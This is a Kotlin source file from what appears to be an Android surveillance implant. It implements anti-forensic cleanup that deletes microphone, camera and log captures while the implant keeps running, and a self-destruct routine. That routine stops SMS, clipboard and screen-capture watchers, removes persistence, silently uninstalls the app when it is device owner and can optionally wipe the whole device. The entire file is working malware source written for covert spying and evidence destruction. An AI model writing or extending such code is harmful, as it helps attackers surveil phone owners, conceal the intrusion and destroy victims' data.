package io.umbra.beacon

import android.app.PendingIntent
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import java.io.File

/**
 * The traces of the implant, and the end of it.
 *
 * An engagement leaves files on the phone: the state of the persistence,
 * the queue of the watchers, the captures of the microphone and the
 * camera, the log of the beacon.  Two tasks deal with them:
 *
 *   * `anti.forensic` removes the material of the engagement but keeps
 *     the implant alive -- the operator is still in the phone and does
 *     not want the phone to carry the evidence of the last hour;
 *   * `evade.suicide` ends everything: the watchers, the capture of the
 *     screen, the persistence entries, the state, the service, and the
 *     application itself when the platform lets it.
 *
 * The suicide reports what it did and what the platform refused.  A
 * report that says "the phone is clean" without saying which of the two
 * happened is not a report.
 */
object Forensics {
    /** The name of the state file of the implant. */
    const val STATE_FILE = "persist.state"

    /** The name of the state file of the evasion engine. */
    const val EVASION_FILE = "evade.state"

    /** The broadcast that would carry the answer of the uninstall. */
    private const val ACTION_UNINSTALL_STATUS = "io.umbra.beacon.UNINSTALL_STATUS"

    /**
     * The files the implant left on the phone.
     *
     * The list is what the operator needs to know: a phone that carries
     * a megabyte of audio is a phone that says something.
     */
    fun traces(stateDir: String): List<String> {
        val out = mutableListOf<String>()
        if (stateDir.isEmpty()) return out
        val dir = File(stateDir)
        val files = dir.listFiles() ?: return out
        for (file in files.sortedBy { it.name }) {
            out.add("${file.name} ${file.length()}")
        }
        return out
    }

    /**
     * Remove the material of the engagement.
     *
     * The implant keeps running: only the evidence goes.
     */
    fun clean(context: Context, stateDir: String): String {
        val removed = mutableListOf<String>()
        var bytes = 0L
        if (stateDir.isNotEmpty()) {
            val dir = File(stateDir)
            val files = dir.listFiles() ?: emptyArray()
            for (file in files) {
                if (file.name == STATE_FILE || file.name == EVASION_FILE) {
                    // The implant needs its own state to survive; only the
                    // material of the engagement goes.
                    continue
                }
                val size = file.length()
                if (file.delete()) {
                    removed.add(file.name)
                    bytes += size
                }
            }
        }
        val out = StringBuilder()
        out.append("anti.forensic: removed ${removed.size} files, $bytes bytes\n")
        for (name in removed) out.append("anti.forensic: removed $name\n")
        val left = traces(stateDir)
        if (left.isEmpty()) {
            out.append("anti.forensic: the phone carries nothing of the engagement\n")
        } else {
            out.append("anti.forensic: the phone still carries ${left.size} files of the implant\n")
            for (line in left) out.append("anti.forensic: left $line\n")
        }
        return out.toString()
    }

    /**
     * The end of the implant.
     *
     * The order matters: the watchers first (they would write into the
     * state that is about to go), then the capture of the screen, then
     * the persistence entries, then the state, then the service, and the
     * application at the end.
     */
    fun suicide(context: Context, stateDir: String, args: Upk): String {
        val out = StringBuilder()
        out.append("evade.suicide: the implant is leaving the phone\n")

        // ---- the watchers ------------------------------------------------
        val sms = SmsWatch.stop(context)
        val clip = ClipboardWatch.stop(context)
        out.append("evade.suicide: $sms\n")
        out.append("evade.suicide: $clip\n")

        // ---- the capture of the screen ------------------------------------
        try {
            ProjectionService.stop(context)
            Projection.clear()
            out.append("evade.suicide: the capture of the screen was stopped\n")
        } catch (t: Throwable) {
            out.append("evade.suicide: the capture of the screen could not be stopped: ${t.message}\n")
        }

        // ---- the persistence ------------------------------------------------
        try {
            TaskRunner.removePersistence()
            out.append("evade.suicide: the persistence entries were taken away\n")
        } catch (t: Throwable) {
            out.append("evade.suicide: the persistence entries could not be taken away: ${t.message}\n")
        }

        // ---- the state -------------------------------------------------------
        if (stateDir.isNotEmpty()) {
            val dir = File(stateDir)
            var bytes = 0L
            var count = 0
            for (file in dir.listFiles() ?: emptyArray()) {
                val size = file.length()
                if (file.delete()) {
                    bytes += size
                    count++
                }
            }
            out.append("evade.suicide: $count files of the state were removed ($bytes bytes)\n")
        }

        // ---- the application --------------------------------------------------
        val deviceOwner = deviceOwner(context)
        if (deviceOwner) {
            // The application is the owner of the profile: it may take
            // itself away without asking the user.
            try {
                val installer = context.packageManager.packageInstaller
                // The public uninstall delivers its result through an
                // IntentSender; the answer is not needed because the
                // application is removing itself, so the pending intent
                // names a broadcast that has no receiver left to hear it.
                // The hidden IPackageInstaller callback has no public type.
                val status = PendingIntent.getBroadcast(
                    context,
                    0,
                    Intent(ACTION_UNINSTALL_STATUS).setPackage(context.packageName),
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
                )
                installer.uninstall(context.packageName, status.intentSender)
                out.append("evade.suicide: the application asked the system to remove it (the profile is its own)\n")
            } catch (t: Throwable) {
                out.append("evade.suicide: the application could not remove itself: ${t.message}\n")
            }
            try {
                val manager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
                manager?.removeActiveAdmin(ComponentName(context, UmbraAdminReceiver::class.java))
                out.append("evade.suicide: the administrator of the device was released\n")
            } catch (t: Throwable) {
                out.append("evade.suicide: the administrator could not be released: ${t.message}\n")
            }
            if (args.field("wipe")?.flag() == true) {
                try {
                    val manager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
                    // wipeData takes the flags of the wipe; the implant
                    // asks for the wipe and nothing else (0), which is the
                    // documented call, not the hidden no-argument one.
                    manager?.wipeData(0)
                    out.append("evade.suicide: the profile of the device was wiped\n")
                } catch (t: Throwable) {
                    out.append("evade.suicide: the profile could not be wiped: ${t.message}\n")
                }
            }
        } else {
            // The application is not the owner of the profile: the system
            // asks the user before it removes anything, so the implant
            // opens that screen and says so.
            try {
                val intent = Intent(Intent.ACTION_DELETE, Uri.parse("package:${context.packageName}"))
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(intent)
                out.append(
                    "evade.suicide: the phone asks the user to remove the application; " +
                        "the implant cannot press that button\n",
                )
            } catch (t: Throwable) {
                out.append("evade.suicide: the removal screen could not be opened: ${t.message}\n")
            }
        }

        // ---- the service ---------------------------------------------------------
        try {
            BeaconService.stop(context)
            out.append("evade.suicide: the beacon was stopped\n")
        } catch (t: Throwable) {
            out.append("evade.suicide: the beacon could not be stopped: ${t.message}\n")
        }
        return out.toString()
    }

    /**
     * Is the application the owner of the profile of the phone?
     *
     * The owner of the profile is the only application that may remove
     * itself without the user and the only one that may wipe the device.
     */
    fun deviceOwner(context: Context): Boolean {
        return try {
            val manager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
            manager != null && manager.isDeviceOwnerApp(context.packageName)
        } catch (_: Throwable) {
            false
        }
    }

    /** The version of the platform, for the reader. */
    fun platform(): String = "android ${Build.VERSION.RELEASE} (api ${Build.VERSION.SDK_INT})"
}
